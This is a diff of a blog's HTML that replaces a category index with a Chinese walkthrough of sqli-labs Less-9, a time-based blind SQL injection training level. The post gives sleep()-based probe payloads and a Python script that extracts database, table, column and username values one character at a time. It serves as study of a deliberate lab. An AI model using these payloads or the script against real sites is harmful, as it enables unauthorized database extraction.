@@ -6,21 +6,26 @@
     
 
     
-    <title>分类：: WEB安全 | 1eAder</title>
+    <title>sqli-labs-less9通关笔记 | 1eAder</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-    <meta name="description" content="本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年">
-<meta name="keywords" content="CTF,hacker,seo,一个热爱网络技术的少年,网络攻防,内网渗透技术">
-<meta property="og:type" content="website">
-<meta property="og:title" content="1eAder">
-<meta property="og:url" content="https://leaderzhang.github.io/categories/WEB安全/index.html">
+        <meta name="keywords" content="sqli-labs" />
+    
+    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-9)首先，我们看到题目的名称为  GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)  所以我们可以知道，这里需要使用单引号和时间盲注等手法来完成。但是我们在实战中如何判断  &amp;emsp;&amp;emsp;在我们注入了SQL代码之后，存在以下两种情况：如果注入的SQL代码不影响">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-less9通关笔记">
+<meta property="og:url" content="https://leaderzhang.github.io/2018/10/25/sqli-labs-less9/index.html">
 <meta property="og:site_name" content="1eAder">
-<meta property="og:description" content="本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年">
+<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-9)首先，我们看到题目的名称为  GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)  所以我们可以知道，这里需要使用单引号和时间盲注等手法来完成。但是我们在实战中如何判断  &amp;emsp;&amp;emsp;在我们注入了SQL代码之后，存在以下两种情况：如果注入的SQL代码不影响">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.imgur.com/2hMvTef.png">
+<meta property="og:updated_time" content="2018-10-25T05:31:49.472Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="1eAder">
-<meta name="twitter:description" content="本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年">
+<meta name="twitter:title" content="sqli-labs-less9通关笔记">
+<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-9)首先，我们看到题目的名称为  GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)  所以我们可以知道，这里需要使用单引号和时间盲注等手法来完成。但是我们在实战中如何判断  &amp;emsp;&amp;emsp;在我们注入了SQL代码之后，存在以下两种情况：如果注入的SQL代码不影响">
+<meta name="twitter:image" content="https://i.imgur.com/2hMvTef.png">
     
 
     
@@ -135,129 +140,161 @@
                         <div class="main-body-header">
     <h1 class="header">
     
-    <i class="icon fa fa-folder-open"></i>分类：: <em class="page-title-link">WEB安全</em>
+    <a class="page-title-link" href="/categories/sqli-labs/">sqli-labs</a>
     </h1>
 </div>
 
                         <div class="main-body-content">
-                            
-
-    
-    
+                            <article id="pages-sqli-labs-less9" class="article article-single article-type-pages" itemscope itemprop="blogPost">
+    <div class="article-inner">
         
-        
-        <section class="archives-wrap">
-            <div class="archive-year-wrap">
-                <a href="/archives/2018" class="archive-year"><i class="icon fa fa-calendar-o"></i>2018</a>
-            </div>
-            <div class="archives">
-    
-    
-    
-        <div class="article-row">
-    
-        <article class="article article-summary">
-    <div class="article-summary-inner">
-        
-        <a href="/2018/10/18/crack-form/" class="thumbnail">
-    
-    
-        <span style="background-image:url(https://i.imgur.com/XP4XnfX.png)" alt="暴力破解表单-无验证码" class="thumbnail-image"></span>
-    
-    
-        
-<span class="comment-counter">
-    <i class="fa fa-comments-o"></i>
-    
-        <span class="disqus-comment-count" data-disqus-identifier="" data-disqus-url="https://leaderzhang.github.io/2018/10/18/crack-form/">0</span>
-    
-</span>
-
-
-    
-</a>
-
-        
-        <div class="article-meta">
-            <div class="category">
-            <a class="article-category-link" href="/categories/WEB安全/">WEB安全</a>
-            </div>
-            <div class="date"><time datetime="2018-10-18T02:58:39.000Z" itemprop="datePublished">2018-10-18</time></div>
-        </div>
-        
+            <header class="article-header">
+                
     
         <h1 class="article-title" itemprop="name">
-        <a href="/2018/10/18/crack-form/">暴力破解表单-无验证码</a>
+        sqli-labs-less9通关笔记
         </h1>
     
 
-        <p class="article-excerpt">
-            表单暴力破解——无验证码“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我
-        </p>
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2018/10/25/sqli-labs-less9/" class="article-date">
+            <time datetime="2018-10-25T05:30:28.000Z" itemprop="datePublished">2018-10-25</time>
+        </a>
     </div>
-</article>
-    
 
-    
-    
-    
-    
-        <article class="article article-summary">
-    <div class="article-summary-inner">
-        
-        <a href="/2018/10/14/study-ssti/" class="thumbnail">
-    
-    
-        <span style="background-image:url(https://i.imgur.com/XHpYuJE.png)" alt="服务端模板注入(SSTI)学习笔记" class="thumbnail-image"></span>
-    
-    
-        
-<span class="comment-counter">
-    <i class="fa fa-comments-o"></i>
-    
-        <span class="disqus-comment-count" data-disqus-identifier="" data-disqus-url="https://leaderzhang.github.io/2018/10/14/study-ssti/">0</span>
-    
-</span>
+		
 
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/sqli-labs/">sqli-labs</a>
+    </div>
 
-    
-</a>
-
-        
-        <div class="article-meta">
-            <div class="category">
-            <a class="article-category-link" href="/categories/WEB安全/">WEB安全</a>
             </div>
-            <div class="date"><time datetime="2018-10-13T19:02:55.000Z" itemprop="datePublished">2018-10-14</time></div>
-        </div>
         
-    
-        <h1 class="article-title" itemprop="name">
-        <a href="/2018/10/14/study-ssti/">服务端模板注入(SSTI)学习笔记</a>
-        </h1>
-    
+        
+        <div class="article-entry" itemprop="articleBody">
+            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-9"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-9" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-9)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-9)</h1><p>首先，我们看到题目的名称为</p>
+<blockquote>
+<p>GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</p>
+</blockquote>
+<p>所以我们可以知道，这里需要使用单引号和时间盲注等手法来完成。<br>但是我们在实战中如何判断</p>
+<hr>
+<p>&emsp;&emsp;在我们注入了SQL代码之后，存在以下两种情况：<br>如果注入的SQL代码不影响后台[数据库]的正常功能执行，那么Web应用的页面显示正确（原始页面）。<br>&emsp;&emsp;如果注入的SQL代码影响后台数据库的正常功能（产生了SQL注入），但是此时Web应用的页面依旧显示正常（原因是Web应用程序采取了“重定向”或“屏蔽”措施）。<br>&emsp;&emsp;这时候，我们就会产生一个疑问：我们注入的的SQL代码到底被后台数据库执行了没有？即Web应用程序是否存在SQL注入？<br>&emsp;&emsp;面对这种情况，之前讲的基于布尔的SQL盲注就很难发挥作用了（因为基于布尔的SQL盲注的前提是Web程序返回的页面存在true和false两种不同的页面）。这时，我们一般采用基于web应用响应时间上的差异来判断是否存在SQL注入，即基于时间型SQL盲注。</p>
+<hr>
+<p>这段话是我在别人博客中看到的，一般来说，在页面没有任何回显和错误信息提示的时候，我们就会测试时间盲注这最后的手法。但是，我们如何从单引号判断开始来进行sql注入，这对于手工注入来说，是很难的。因为我们需要进行许多测试，单引号，双引号，括号等，不断的尝试闭合语句的符号到底是哪个或者哪些。所以，在这种情况下，我一般都是使用sqlmap这类工具来进行注入。</p>
+<p>好像也是一段废话。。。。</p>
+<p>但是，我找了很久，还是没有找到一篇合适的文章来讲解，如何从0开始进行盲注，我也很奇怪在不看源码的情况下，如何对闭合语句进行判断。因为如何不能正确的判断闭合语句，那么就不会产生sql语句的<strong>拼接</strong>。实战中，我们如果可以获取网站后台源码，那就可以清楚的知道闭合语句是什么。但是往往我们无法对网站后台源码进行查看，所以最好的办法就是利用burpsuite和字典进行参数的fuzz爆破。</p>
+<p>字典类似如下:</p>
+<blockquote>
+<p>‘<br>“<br>‘)<br>“)<br>}<br>.<br>.<br>.<br>等等</p>
+</blockquote>
+<p>说白了，也跟sqlmap一样，对参数进行fuzz。</p>
+<p>好了，说了这么多没用的，我们开始我们的第九关~</p>
+<hr>
+<p>我们知道是单引号的闭合后，我们就方便很多。</p>
+<p>常用的判断语句:</p>
+<p>‘and if(1，sleep(5),1) %23</p>
+<p>‘ and if(1=0,1, sleep(10)) –+    </p>
+<p>“ and if(1=0,1, sleep(10)) –+</p>
+<p>) and if(1=0,1, sleep(10)) –+</p>
+<p>‘) and if(1=0,1, sleep(10)) –+</p>
+<p>“) and if(1=0,1, sleep(10)) –+</p>
+<p>这里我用的是<code>&#39;and if(1，sleep(5),1) %23</code></p>
+<p>在index.php?id=1后加上这句payload会延时5秒才返回页面，可以从控制台的network中查看时间</p>
+<p><img src="https://i.imgur.com/2hMvTef.png" alt="网页延时5秒后的响应时间"></p>
+<p><img src="https://i.imgur.com/w1lPY84.png" alt="页面正常返回的时候的响应时间"></p>
+<p>但是我这里突然发现，Content-length的长度不一样，也可以来判断页面正常与否，所以其实这题可以用布尔型盲注来解决。</p>
+<p>好了，基于时间盲注的payload有很多，基本原理是使用if函数来判断条件是否成立。</p>
+<p>我使用的payload:<br>id=1’ and If(mid(<strong>(select schema_name from information_schema.schemata limit 0,1),2,1)=’h’</strong>,1,sleep(5))–+</p>
+<p>这里修改加粗部分就行，以下是python脚本代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://sql-test.com/less-9/index.php?id=1&quot;</span><br><span class="line">def sqli(urls):</span><br><span class="line">    r = requests.get(url=urls)</span><br><span class="line">    if time.time() - start_time &gt;3:</span><br><span class="line">        return 1</span><br><span class="line">    else:</span><br><span class="line">        return 0</span><br><span class="line">def main():</span><br><span class="line">    info = &quot;&quot;</span><br><span class="line">    global start_time</span><br><span class="line">    payload_get_db_lenth = &quot;&apos; and if (length(database())=&#123;0&#125;,1,sleep(5))%23&quot; #如果数据库长度等于8，则页面无延迟返回，如果不为8，则延时5秒返回。</span><br><span class="line">    payload_get_db_name  = &quot;&apos; and if (mid(database(),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,1,sleep(5))%23&quot; #占位符&#123;0&#125;表示数据库名的第几位,&#123;1&#125;表示字符</span><br><span class="line">    payload_get_table_lenth = &quot;&apos; and if (length((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1))=&#123;1&#125;,1,sleep(5))%23&quot;#占位符&#123;0&#125;表示当前数据库的第几个表 ，&#123;1&#125;表示长度</span><br><span class="line">    payload_get_table_name  = &quot;&apos; and if (mid((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,1,sleep(5))%23&quot;#占位符&#123;0&#125;表示第几个表，&#123;1&#125;表示表的第几位，&#123;2&#125;表示字符</span><br><span class="line">    payload_get_columns_lenth = &quot;&apos; and if (length((select column_name from information_schema.columns where table_name = &apos;users&apos; and table_schema = &apos;security&apos; limit &#123;0&#125;,1))=&apos;&#123;1&#125;&apos;,1,sleep(5))%23&quot;</span><br><span class="line">    payload_get_columns_name = &quot;&apos; and if (mid((select column_name from information_schema.columns where table_name = &apos;users&apos; and table_schema = &apos;security&apos; limit &#123;0&#125;,1)),&#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,1,sleep(5))%23)&quot;</span><br><span class="line">    payload_get_data = &quot;&apos; and if (mid((select username from users limit &#123;0&#125;,1),&#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,1,sleep(5))%23&quot;</span><br><span class="line">    payload_get_data2 = r&quot;&apos; and if (mid((select username from users limit 0,1),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep(5),1)%23&quot;</span><br><span class="line">    payloads = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for k in payloads:</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            urls = url+payload_get_data2.format(i,k)</span><br><span class="line">            flag=sqli(urls)</span><br><span class="line">            print(urls)</span><br><span class="line">            if flag ==1:</span><br><span class="line">                info +=k</span><br><span class="line">                print(&quot;[+]第%s位内容为:%s&quot;%(i,k))</span><br><span class="line">    print(&quot;数据内容：&quot;,info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p>但是我发现，mysql中是不区分大小写的，查了一会才知道，需要将数据库的字符集改一下。不得不说，这的确是个坑哦，不过用ascii来判断应该就不存在这个问题了！</p>
+<p>好了，第九关也完成啦~</p>
 
-        <p class="article-excerpt">
-            #服务端模板注入(SSTI)学习笔记
-我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。
-
-So，模板注入这个东西的起因就是因为方便
+        </div>
+        <footer class="article-footer">
+            
 
 
-##如何造成的注入呢？
-学习Web安全的时候，有一条规则是大家公认的。
-一切用户可控的值，都是不安全的
-用这次护网杯的一道WEB题来了
-        </p>
+
+    <a data-url="https://leaderzhang.github.io/2018/10/25/sqli-labs-less9/" data-id="cjno5i3db000swsnuw1u51bhs" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
     </div>
 </article>
+
+    <section id="comments">
     
-        </div>
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
     
-
-
-    </div></section>
-
+    </section>
 
 
 
@@ -319,6 +356,19 @@ So，模板注入这个东西的起因就是因为方便
             
         </ul>
     </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2018/10/24/sqli-labs-less8/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">上一篇</strong>
+        <p class="article-nav-title">sqli-labs-less8通关笔记</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
     
     <div class="widgets-container">
         
@@ -527,11 +577,13 @@ So，模板注入这个东西的起因就是因为方便
     var disqus_shortname = 'hexo-theme-hueman';
     
     
+    var disqus_url = 'https://leaderzhang.github.io/2018/10/25/sqli-labs-less9/';
+    
     (function() {
     var dsq = document.createElement('script');
     dsq.type = 'text/javascript';
     dsq.async = true;
-    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
     (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
     </script>
